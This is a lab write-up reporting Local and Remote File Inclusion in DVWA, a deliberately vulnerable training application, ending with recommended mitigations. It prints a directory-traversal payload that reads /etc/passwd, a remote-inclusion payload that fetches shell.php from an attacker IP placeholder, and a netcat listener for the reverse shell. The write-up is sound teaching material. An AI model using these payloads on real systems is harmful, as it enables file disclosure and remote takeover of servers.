FILE INCLUSION VULNERABILITY ASSESSMENT REPORT

Target Application:  DVWA (Damn Vulnerable Web Application)
Vulnerability Type: File Inclusion (LFI/RFI)
Security Level:
Severity: Critical
Testing Environment: Educational Lab

INTRODUCTION

This report documents the exploitation of a File Inclusion vulnerability in DVWA at the Low security level.

File Inclusion vulnerabilities occur when a web application improperly includes files based on user-controlled input. Attackers may exploit this weakness to read sensitive files from the server or load remote malicious content.

The assessment demonstrates both:

Local File Inclusion (LFI)
Remote File Inclusion (RFI)
OBJECTIVE

The objective of this assessment was to:

Identify file inclusion vulnerabilities
Access sensitive local system files
Demonstrate remote file inclusion
Evaluate insecure file handling mechanisms
TOOLS USED
Web Browser
DVWA
Netcat
PHP Test Files
HTTP Requests
VULNERABILITY DESCRIPTION

The DVWA File Inclusion module dynamically loads files based on the value supplied through the URL parameter:

page=

The application fails to properly validate or sanitize user input before including files.

Because of this, attackers can manipulate the parameter to:

Access sensitive local files
Traverse directories
Load remote resources
Execute malicious scripts
EXPLOITATION PROCESS

Step 1: Access the File Inclusion Module

The DVWA File Inclusion page was opened from the vulnerabilities menu.

The application displayed several file links.

Step 2: Observe URL Parameters

When selecting a file, the following URL structure was observed:

http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php

The page parameter controls which file is loaded by the application.

LOCAL FILE INCLUSION (LFI)

The page parameter was modified to reference a sensitive system file using directory traversal sequences.

Payload Used:

page=../../../../../etc/passwd

OBSERVED RESULT

The contents of the Linux system file:

/etc/passwd

were displayed successfully in the browser.

This confirmed that Local File Inclusion (LFI) was possible.

SECURITY IMPACT OF LFI

Successful LFI exploitation may allow attackers to:

Read sensitive system files
Access configuration files
Retrieve application source code
Discover usernames and system information
Assist further attacks
REMOTE FILE INCLUSION (RFI)

The application was further tested for Remote File Inclusion.

A remote URL was supplied as the page parameter.

Example Payload:

page=https://www.google.com

OBSERVED RESULT

The remote webpage content was loaded directly into the application.

This confirmed that Remote File Inclusion (RFI) was enabled at the Low security level.

SECURITY IMPACT OF RFI

Remote File Inclusion is highly dangerous because attackers may:

Execute malicious remote scripts
Upload backdoors
Gain remote code execution
Obtain server access
Fully compromise the target system

The impact is considered Critical.

REVERSE SHELL DEMONSTRATION

A remote PHP shell file was hosted on an attacker-controlled server.

Example Payload:

page=http://<attacker-ip>/shell.php

Step 1: Start Netcat Listener

The following listener was started on the attack machine:

nc -nlvp 4444

Step 2: Trigger Remote Shell

The malicious file inclusion payload was submitted through the vulnerable parameter.

If executed successfully, the target server initiated a reverse connection back to the attacker machine.

RESULT

The application successfully included remote content supplied by user input.

This demonstrated that arbitrary remote files could be executed by the server.

ROOT CAUSE

The vulnerability exists because the application directly includes files based on user-controlled input without proper validation or restrictions.

Missing protections include:

Input sanitization
File path validation
Directory restrictions
Remote inclusion restrictions
Allowlist enforcement
SECURITY IMPACT

An attacker exploiting this vulnerability may be able to:

Read sensitive local files
Execute remote malicious code
Gain server access
Upload web shells
Escalate privileges
Fully compromise the application server
RECOMMENDATIONS

The following mitigations are recommended:

Validate User Input

Only allow approved file names and expected values.

Use Allowlists

Restrict file inclusion to predefined safe files.

Disable Remote File Inclusion

Disable remote URL inclusion in PHP configuration.

Example:

allow_url_include = Off

Restrict Directory Access

Prevent directory traversal attacks using secure path handling.

Avoid Dynamic File Inclusion

Do not directly include files based on user-controlled parameters.

Implement Least Privilege

Limit file system permissions for the web server.

Monitor Inclusion Attempts

Log suspicious requests involving traversal patterns such as:

../

CONCLUSION

The assessment confirmed that the DVWA application at the Low security level is critically vulnerable to both Local File Inclusion (LFI) and Remote File Inclusion (RFI) attacks.

Because the application directly processes unsanitized file paths supplied by users, attackers can access sensitive files and potentially execute malicious remote code.
